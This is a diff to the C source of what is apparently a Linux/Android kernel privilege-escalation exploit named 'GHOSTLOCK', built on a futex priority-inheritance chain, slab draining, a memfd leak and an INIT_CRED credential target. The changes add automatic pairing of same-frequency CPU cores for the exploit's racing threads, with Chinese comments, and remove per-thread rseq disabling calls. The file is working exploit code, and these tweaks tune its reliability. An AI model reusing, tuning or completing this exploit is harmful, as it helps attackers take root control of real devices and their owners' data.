@@ -552,7 +552,6 @@ atomic_int pipe_prepare_done;
 int memfd_leak;
 
 void *waiter_thread(void *arg __attribute__((unused))) {
-  disable_rseq_for_thread();
   int tid = (int)syscall(SYS_gettid);
   atomic_store(&waiter_tid, tid);
   if (futex_op(&f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0)
@@ -572,7 +571,6 @@ void *waiter_thread(void *arg __attribute__((unused))) {
 }
 
 void *owner_thread(void *arg __attribute__((unused))) {
-  disable_rseq_for_thread();
   long lock_target = futex_op(&f_pi_target, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
   if (lock_target != 0) pr_error("owner lock target errno=%d\n", errno);
   while (!atomic_load(&waiter_ready)) usleep(1000);
@@ -586,7 +584,6 @@ void *owner_thread(void *arg __attribute__((unused))) {
 }
 
 void *consumer_thread(void *arg __attribute__((unused))) {
-  disable_rseq_for_thread();
   pin_to_core(CONSUMER_CORE);
   pr_info("consumer thread running on cpu=%d\n", sched_getcpu());
   int seen = 0;
@@ -759,38 +756,184 @@ static void slab_drain(void) {
 
 int g_core_main = 0;
 int g_core_consumer = 1;
+#define MAX_CPUS 256
+#define MAX_PAIRS 256
+
+typedef struct {
+  int cpu;
+  long freq;
+} cpu_freq_t;
+
+typedef struct {
+  int main_core;
+  int consumer_core;
+} cpu_pair_t;
+
+static long read_sysfs_long(const char *path) {
+  FILE *fp = fopen(path, "r");
+  if (!fp) {
+    return -1;
+  }
+  char buf[64];
+  if (!fgets(buf, sizeof(buf), fp)) {
+    fclose(fp);
+    return -1;
+  }
+  fclose(fp);
+  return strtol(buf, NULL, 10);
+}
+
+static int parse_online_cpus(int *out, int max) {
+  FILE *fp = fopen("/sys/devices/system/cpu/online", "r");
+  if (!fp) {
+    return 0;
+  }
+  char buf[256];
+  if (!fgets(buf, sizeof(buf), fp)) {
+    fclose(fp);
+    return 0;
+  }
+  fclose(fp);
+
+  int n = 0;
+  for (char *p = buf; *p && n < max;) {
+    while (*p == ' ' || *p == ',') {
+      p++;
+    }
+    if (!*p || *p == '\n') {
+      break;
+    }
+    char *end;
+    long a = strtol(p, &end, 10);
+    if (end == p) {
+      break;
+    }
+    p = end;
+    long b = a;
+    if (*p == '-') {
+      p++;
+      b = strtol(p, &end, 10);
+      if (end == p) {
+        break;
+      }
+      p = end;
+    }
+    for (long v = a; v <= b && n < max; v++) {
+      out[n++] = (int)v;
+    }
+  }
+  return n;
+}
+
+static int cmp_cpu_freq_desc(const void *a, const void *b) {
+  const cpu_freq_t *x = (const cpu_freq_t *)a;
+  const cpu_freq_t *y = (const cpu_freq_t *)b;
+  if (x->freq != y->freq) {
+    return (x->freq < y->freq) - (x->freq > y->freq); /* 频率降序 */
+  }
+  return x->cpu - y->cpu; /* 同频按编号升序 */
+}
 
 void init_cpu_config(void) {
-  g_core_main = 0;
-  g_core_consumer = 1;
+  int online[MAX_CPUS];
+  int ncpu = parse_online_cpus(online, MAX_CPUS);
 
-  const char *s = getenv("GHOSTLOCK_CORE");
-  if (s && *s) {
-    long v = strtol(s, NULL, 10);
-    if (v >= 0 && v < CPU_SETSIZE) {
-      g_core_main = (int)v;
-    } else {
-      pr_warning("invalid GHOSTLOCK_CORE=%s, using %d\n", s, g_core_main);
+  cpu_freq_t freqs[MAX_CPUS];
+  int nf = 0;
+  for (int i = 0; i < ncpu && nf < MAX_CPUS; i++) {
+    char path[128];
+    snprintf(path, sizeof(path),
+             "/sys/devices/system/cpu/cpu%d/cpufreq/cpuinfo_max_freq",
+             online[i]);
+    long f = read_sysfs_long(path);
+    if (f <= 0) {
+      continue; /* 读不到最大频率的核不参与配对 */
     }
-  }
-  s = getenv("GHOSTLOCK_CONSUMER_CORE");
-  if (s && *s) {
-    long v = strtol(s, NULL, 10);
-    if (v >= 0 && v < CPU_SETSIZE) {
-      g_core_consumer = (int)v;
-    } else {
-      pr_warning("invalid GHOSTLOCK_CONSUMER_CORE=%s, using %d\n", s,
-                 g_core_consumer);
-    }
-  } else {
-    g_core_consumer = g_core_main + 1;
+    freqs[nf].cpu = online[i];
+    freqs[nf].freq = f;
+    nf++;
   }
 
-  if (g_core_main == g_core_consumer) {
-    pr_warning("main and consumer cores are the same (%d); falling back\n",
-               g_core_main);
-    g_core_main = 0;
-    g_core_consumer = 1;
+  cpu_pair_t pairs[MAX_PAIRS];
+  int npair = 0;
+
+  if (nf >= 2) {
+    qsort(freqs, nf, sizeof(freqs[0]), cmp_cpu_freq_desc);
+
+    /* 按频率簇分组（同频），簇内两两配对，大核簇排最前 */
+    for (int i = 0; i < nf && npair < MAX_PAIRS;) {
+      int j = i;
+      while (j < nf && freqs[j].freq == freqs[i].freq) {
+        j++;
+      }
+      int cnt = j - i;
+      for (int k = 0; k + 1 < cnt && npair < MAX_PAIRS; k += 2) {
+        pairs[npair].main_core = freqs[i + k].cpu;
+        pairs[npair].consumer_core = freqs[i + k + 1].cpu;
+        npair++;
+      }
+      i = j;
+    }
+  }
+
+  /* 兜底：确保 0/1 一定作为候选（与 Android 端行为一致） */
+  int have_default = 0;
+  for (int i = 0; i < npair; i++) {
+    if (pairs[i].main_core == 0 && pairs[i].consumer_core == 1) {
+      have_default = 1;
+      break;
+    }
+  }
+  if (!have_default && npair < MAX_PAIRS) {
+    pairs[npair].main_core = 0;
+    pairs[npair].consumer_core = 1;
+    npair++;
+  }
+
+  printf("available cpu pairs (%d):\n", npair);
+  for (int i = 0; i < npair; i++) {
+    long f = -1;
+    for (int k = 0; k < nf; k++) {
+      if (freqs[k].cpu == pairs[i].main_core) {
+        f = freqs[k].freq;
+        break;
+      }
+    }
+    printf("  [%d] main=%d consumer=%d", i, pairs[i].main_core,
+           pairs[i].consumer_core);
+    if (f > 0) {
+      printf("  (%ld MHz)", f / 1000);
+    }
+    printf("\n");
+  }
+
+  int chosen = 0;
+
+  /* 环境变量显式指定时优先（与 Android 端传参保持一致） */
+  const char *sc = getenv("GHOSTLOCK_CORE");
+  const char *cc = getenv("GHOSTLOCK_CONSUMER_CORE");
+  if (sc && *sc && cc && *cc) {
+    long vm = strtol(sc, NULL, 10);
+    long vc = strtol(cc, NULL, 10);
+    if (vm >= 0 && vm < CPU_SETSIZE && vc >= 0 && vc < CPU_SETSIZE &&
+        vm != vc) {
+      g_core_main = (int)vm;
+      g_core_consumer = (int)vc;
+      chosen = 1;
+    } else {
+      pr_warning("invalid env cores %s/%s; falling back to auto\n", sc, cc);
+    }
+  }
+
+  /* 自动选最合适的：候选列表第 0 组（大核对） */
+  if (!chosen) {
+    if (npair > 0) {
+      g_core_main = pairs[0].main_core;
+      g_core_consumer = pairs[0].consumer_core;
+    } else {
+      g_core_main = 0;
+      g_core_consumer = 1;
+    }
   }
 
   cpu_set_t allowed;
@@ -1100,7 +1243,6 @@ int run_exploit(int argc, char **argv) {
   }
   g_init_cred_image = INIT_CRED;
 
-  disable_rseq_for_thread();
   set_unbuffer();
   signal(SIGPIPE, SIG_IGN);
   set_limit();
